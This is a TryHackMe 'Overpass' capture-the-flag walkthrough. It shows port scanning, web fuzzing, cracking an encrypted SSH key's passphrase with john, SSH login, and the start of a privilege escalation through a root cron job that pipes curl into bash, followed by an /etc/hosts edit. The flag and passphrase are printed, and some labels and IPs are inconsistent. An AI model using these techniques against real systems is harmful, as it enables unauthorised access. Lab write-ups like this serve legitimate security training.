---
tags:
  - THM
link: https://tryhackme.com/room/overpass
description: What happens when some broke CompSci students make a password manager?
---
## Summary

| SECTION/TASK     | FLAG |
| ---------------- | ---- |
| Task 1. Overpass |      |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1. Overpass

What happens when a group of broke Computer Science students try to make a password manager?  
Obviously a _perfect_ commercial success!

There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?

UPDATE: The code is now claimed.  
The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.
<div>
<br>
<br>
</div>

### Questions

#### Hack the machine and get the flag in user.txt
==thm{65c1aaf000506e56996822c6281e6bf7}==

##### Stage 1: Recon (Information Gathering)

###### 1. Connecting to the TryHackMe VPN

Before interacting with the target machine, connect to the TryHackMe VPN using my `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command:

`sudo openvpn <myprofile>.ovpn`

Once the VPN initialized successfully, confirm the connection by checking for the `Initialization Sequence Completed` message in the terminal.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### ## 2. Verifying the Target is Reachable

After connecting to the VPN, verify that the target machine is up and reachable by performing an ICMP ping test.

Command: `ping -c 4 <TARGET_IP>`

Breakdown:
- `-c 4` → sends 4 packets only (clean output, fast)

Output:

```
┌──(kali㉿kali)-[~]
└─$ ping -c 4 10.64.165.146
PING 10.64.165.146 (10.64.165.146) 56(84) bytes of data.
64 bytes from 10.64.165.146: icmp_seq=1 ttl=62 time=203 ms
64 bytes from 10.64.165.146: icmp_seq=2 ttl=62 time=202 ms
64 bytes from 10.64.165.146: icmp_seq=3 ttl=62 time=204 ms
64 bytes from 10.64.165.146: icmp_seq=4 ttl=62 time=202 ms

--- 10.64.165.146 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3056ms
rtt min/avg/max/mdev = 202.132/202.809/203.644/0.571 ms
```

A successful response confirms that the machine is active and accessible on the TryHackMe network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

##### Stage 2: Enumeration (Network & Port Scanning)

We’ll first want to check the target for any open ports that we can exploit.

Command: `nmap -sV -sC -A -T4 -p- --min-rate 1000 -oN nmap.txt 10.65.152.254`

Breakdown:
- **`nmap`**
    - **Description:** The utility itself.
    - **Purpose:** Starts the network scanning application.
- **`-sV`**
    - **Description:** Service Version Detection.
    - **Purpose:** Attempts to determine the version of the service running on open ports (e.g., Apache 2.4.41, OpenSSH 7.2p2).
- **`-sC`**
    - **Description:** Default Script Scan.
    - **Purpose:** Runs default, safe Nmap scripts to check for common vulnerabilities, weak passwords, or gather more details.
- **`-A`**
    - **Description:** Aggressive Scan.
    - **Purpose:** Enables OS detection, version detection, script scanning, and traceroute. Comprehensive but noisier.
- **`-T4`**
    - **Description:** Timing Template 4 (Aggressive).
    - **Purpose:** Speeds up the scan with more aggressive timing. Faster but may be less accurate or trigger IDS/IPS.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- **`--min-rate 1000`**
    - **Description:** Packet Rate Limit.
    - **Purpose:** Ensures at least 1,000 packets per second, speeding up large scans.
- **`-oN nmap.txt`**
    - **Description:** Output to Normal format. 
    - **Purpose:** Saves scan results to `nmap.txt` in human-readable format.
- **`10.65.152.254`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

Output:

```shell
┌──(kali㉿kali)-[~/ET/THM/Overpass]
└─$ nmap -sV -sC -A -T4 -p- --min-rate 1000 -oN nmap.txt 10.65.152.254
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 07:14 EST
Nmap scan report for 10.65.152.254
Host is up (0.20s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:52:de:ab:a3:37:77:1f:6b:63:94:b3:ca:7f:04:ad (RSA)
|   256 1e:13:06:9f:e3:4d:71:50:2b:ba:d8:9b:7a:e8:13:24 (ECDSA)
|_  256 0e:68:d7:fa:57:99:22:6f:44:43:34:0e:3f:a3:5b:f0 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   202.17 ms 192.168.128.1
2   ...
3   203.70 ms 10.65.152.254

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.15 seconds
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

So we see that port 22 and 80 are open, port 80 means that they have a website hosted but first let's see what other directories and pages are available. 

Command:

`nmap -sV -sC -A -T4 -p- --min-rate 1000 -oN nmap.txt 10.65.152.254`

Breakdown:
- **ffuf**
    - **Description:** Fast web fuzzer.
    - **Purpose:** Performs fuzzing to discover hidden directories, files, or parameters on a web server.
- **-u [http://10.65.152.254/FUZZ](http://10.65.152.254/FUZZ)**
    - **Description:** Target URL with the **FUZZ** keyword.
    - **Purpose:** Tells ffuf where to inject words from the wordlist.
- **-w /usr/share/seclists/Discovery/Web-Content/common.txt**
    - **Description:** Wordlist option.
    - **Purpose:** Specifies the wordlist to use for fuzzing. In this case, a common directory/file discovery list from SecLists.

Output:

```shell
┌──(kali㉿kali)-[~/ET/THM/Overpass]
└─$ ffuf -u http://10.65.152.254/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.65.152.254/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 206ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
render/https://www.google.com [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 207ms]
:: Progress: [4746/4746] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

Our biggest find is the admin path and this is what the `/admin` page looks like:

![[Pasted image 20251202154014.png]]

Inspect the page source:

```html
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Overpass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/login.css">
    <link rel="icon" type="image/png" href="/img/overpass.png" />
    <script src="/main.js"></script>
    <script src="/login.js"></script>
    <script src="/cookie.js"></script>
</head>

<body onload="onLoad()">
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a class="current" href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <div class="content">
        <h1>Administrator area</h1>
        <p>Please log in to access this content</p>
        <div>
            <h3 class="formTitle">Overpass administrator login</h1>
        </div>
        <form id="loginForm">
            <div class="formElem"><label for="username">Username:</label><input id="username" name="username" required></div>
            <div class="formElem"><label for="password">Password:</label><input id="password" name="password"
                    type="password" required></div>
            <button>Login</button>
        </form>
        <div id="loginStatus"></div>
    </div>
</body>

</html>
```

Inspect the `login.js` file:

```js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

![[Pasted image 20251202160720.png]]

```shell
┌──(kali㉿kali)-[~/ET/THM/Overpass]
└─$ vi id_rsa

┌──(kali㉿kali)-[~/ET/THM/Overpass]
└─$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----

```

```shell
──(kali㉿kali)-[~/ET/THM/Overpass]
└─$ locate ssh2john                                 
/usr/bin/ssh2john
/usr/share/john/ssh2john.py
/usr/share/john/__pycache__/ssh2john.cpython-313.pyc

┌──(kali㉿kali)-[~/ET/THM/Overpass]
└─$ /usr/share/john/ssh2john.py id_rsa > hash       

┌──(kali㉿kali)-[~/ET/THM/Overpass]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2025-12-02 09:03) 20.00g/s 267520p/s 267520c/s 267520C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```shell
┌──(kali㉿kali)-[~/ET/THM/Overpass]
└─$ ssh -i id_rsa james@10.65.152.254
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Dec  2 14:13:17 UTC 2025

  System load:  0.0                Processes:             101
  Usage of /:   30.7% of 18.53GB   Users logged in:       0
  Memory usage: 14%                IPv4 address for eth0: 10.65.152.254
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

58 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@ip-10-65-152-254:~$ 
```

```shell
james@ip-10-65-152-254:~$ ls
todo.txt  user.txt
james@ip-10-65-152-254:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
```
<div>
<br>
</div>

#### Escalate your privileges and get the flag in root.txt
====

```
james@ip-10-65-152-254:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@ip-10-65-152-254:~$ 
```

```shell
james@ip-10-65-152-254:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@ip-10-65-152-254:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

```shell
james@ip-10-65-152-254:~$ vi /etc/hosts
james@ip-10-65-152-254:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.65.152.254 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```




<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

